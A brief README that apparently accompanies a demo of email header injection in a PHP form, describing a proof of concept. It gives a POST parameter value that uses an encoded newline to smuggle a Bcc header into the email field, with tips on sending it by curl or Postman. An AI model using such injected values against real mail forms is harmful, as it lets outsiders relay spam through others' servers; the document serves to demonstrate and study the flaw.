### Proof of concept for E-Mail header Injection in PHP

* Simple to reproduce attack, construct a http request with the following contents:
    * method = 'post'
    * params = {
        email = sai@sai.com%0abcc:sss@sss.com
    }

* Make sure to construct the http request using curl (if you are ok with command-line),
or with Postman (Chrome), or HTTPRequester (Firefox), this is to prevent the browsers
from double encoding the strings you send.
* Can also be constructed from URL. Not sure if I made this do-able from the text field.
